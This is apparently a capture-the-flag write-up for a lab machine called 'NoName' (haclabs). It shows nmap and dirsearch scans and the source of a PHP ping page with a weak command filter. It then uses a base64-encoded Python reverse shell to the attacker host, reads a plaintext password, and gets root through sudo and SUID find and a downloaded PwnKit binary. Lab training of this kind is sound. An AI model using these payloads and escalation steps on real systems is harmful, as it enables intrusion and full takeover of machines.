@@ -1,0 +1,175 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body>IP - 192.168.191.15<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/NoName]<br/>
+└─# nmap -sC -sV 192.168.191.15 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 06:07 +0630<br/>
+Nmap scan report for 192.168.191.15<br/>
+Host is up (0.28s latency).<br/>
+Not shown: 65534 closed tcp ports (reset)<br/>
+PORT &nbsp; STATE SERVICE VERSION<br/>
+80/tcp open &nbsp;http &nbsp; &nbsp;Apache httpd 2.4.29 ((Ubuntu))<br/>
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).<br/>
+|_http-server-header: Apache/2.4.29 (Ubuntu)<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 788.73 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+<br/>
+dirsearch result<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# dirsearch -u http://192.168.191.15/ -e php -f -x 400,403<br/>
+<br/>
+&nbsp; _|. _ _ &nbsp;_ &nbsp;_ &nbsp;_ _|_ &nbsp; &nbsp;v0.4.2<br/>
+&nbsp;(_||| _) (/_(_|| (_| )<br/>
+<br/>
+Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441<br/>
+<br/>
+Output File: /root/.dirsearch/reports/192.168.191.15/-_23-02-21_06-08-16.txt<br/>
+<br/>
+Error Log: /root/.dirsearch/logs/errors-23-02-21_06-08-16.log<br/>
+<br/>
+Target: http://192.168.191.15/<br/>
+<br/>
+[06:08:16] Starting: <br/>
+[06:09:01] 200 - &nbsp;417B &nbsp;- /admin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+[06:09:45] 200 - &nbsp;201B &nbsp;- /index.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+[06:09:45] 200 - &nbsp;201B &nbsp;- /index.php/login/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[06:10:22] 200 - &nbsp;152B &nbsp;- /superadmin.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Task Completed<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+superadmin.php source code:<br/>
+<br/>
+&lt;?php<br/>
+&nbsp; &nbsp;if (isset($_POST['submitt']))<br/>
+{<br/>
+&nbsp; &nbsp;&#09;$word=array(";","&amp;&amp;","/","bin","&amp;"," &amp;&amp;","ls","nc","dir","pwd");<br/>
+&nbsp; &nbsp;&#09;$pinged=$_POST['pinger'];<br/>
+&nbsp; &nbsp;&#09;$newStr = str_replace($word, "", $pinged);<br/>
+&nbsp; &nbsp;&#09;if(strcmp($pinged, $newStr) == 0)<br/>
+&#09;&#09;{<br/>
+&#09;&#09; &nbsp; &nbsp;$flag=1;<br/>
+&#09;&#09;}<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;else<br/>
+&#09;&#09;{<br/>
+&#09;&#09; &nbsp; $flag=0;<br/>
+&#09;&#09;}<br/>
+}<br/>
+<br/>
+if ($flag==1){<br/>
+$outer=shell_exec("ping -c 3 $pinged");<br/>
+echo "&lt;pre&gt;$outer&lt;/pre&gt;";<br/>
+}<br/>
+?&gt;<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I got reverse shell from superadmin.php with this payload:<br/>
+<br/>
+<br/>
+payload - | echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNDUuNSIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIikn" | base64 -d | sh<br/>
+<br/>
+I encoded the python3 reverse shell with base64<br/>
+<br/>
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/NoName]<br/>
+└─# nc -lvnp 4444<br/>
+listening on [any] 4444 ...<br/>
+connect to [192.168.45.5] from (UNKNOWN) [192.168.191.15] 42734<br/>
+$ whoami<br/>
+whoami<br/>
+www-data<br/>
+<br/>
+www-data@haclabs:/home/yash$ cat local.txt <br/>
+a0c7123e609b297857933b8234f1fc7c<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Found hacklabs passowrd:<br/>
+<br/>
+www-data@haclabs:/tmp$ cat /usr/share/hidden/.passwd<br/>
+haclabs1234<br/>
+<br/>
+username - haclabs<br/>
+password - haclabs1234<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation ((root) NOPASSWD: /usr/bin/find)<br/>
+<br/>
+I switch into haclab and execute sudo -l and found:<br/>
+<br/>
+haclabs@haclabs:/tmp$ sudo -l<br/>
+Matching Defaults entries for haclabs on haclabs:<br/>
+&nbsp; &nbsp; env_reset, mail_badpass,<br/>
+&nbsp; &nbsp; secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br/>
+<br/>
+User haclabs may run the following commands on haclabs:<br/>
+&nbsp; &nbsp; (root) NOPASSWD: /usr/bin/find<br/>
+<br/>
+<br/>
+<br/>
+So, I search at gtfobin and found:<br/>
+<br/>
+https://gtfobins.github.io/gtfobins/find/#suid<br/>
+<br/>
+haclabs@haclabs:/tmp$ sudo find . -exec /bin/sh \; -quit<br/>
+# whoami<br/>
+root<br/>
+# bash -i<br/>
+<br/>
+root@haclabs:/root# cat proof.txt <br/>
+e4b519a18304dac952299deeff64bcac<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Another way to Privilege Escalation (SUID)<br/>
+<br/>
+www-data@haclabs:/tmp$ /usr/bin/find . -exec /bin/sh -p \; -quit<br/>
+# whoami<br/>
+root<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Another way to Privilege Escalation (kernel exploit PwnKit)<br/>
+<br/>
+From My Machine:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/tools/Pwnkit]<br/>
+└─# python2 -m SimpleHTTPServer 80<br/>
+Serving HTTP on 0.0.0.0 port 80 ...<br/>
+192.168.191.15 - - [21/Feb/2023 06:34:16] "GET /PwnKit HTTP/1.1" 200 -<br/>
+<br/>
+Victim Machine:<br/>
+<br/>
+www-data@haclabs:/tmp$ wget http://192.168.45.5/PwnKit<br/>
+--2023-02-21 05:34:16-- &nbsp;http://192.168.45.5/PwnKit<br/>
+Connecting to 192.168.45.5:80... connected.<br/>
+HTTP request sent, awaiting response... 200 OK<br/>
+Length: 16800 (16K) [application/octet-stream]<br/>
+Saving to: 'PwnKit'<br/>
+<br/>
+PwnKit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;100%[===================&gt;] &nbsp;16.41K &nbsp;58.3KB/s &nbsp; &nbsp;in 0.3s &nbsp; &nbsp;<br/>
+<br/>
+2023-02-21 05:34:17 (58.3 KB/s) - 'PwnKit' saved [16800/16800]<br/>
+<br/>
+www-data@haclabs:/tmp$ chmod +x PwnKit <br/>
+www-data@haclabs:/tmp$ ./PwnKit<br/>
+root@haclabs:/tmp# whoami<br/>
+root</body></html>
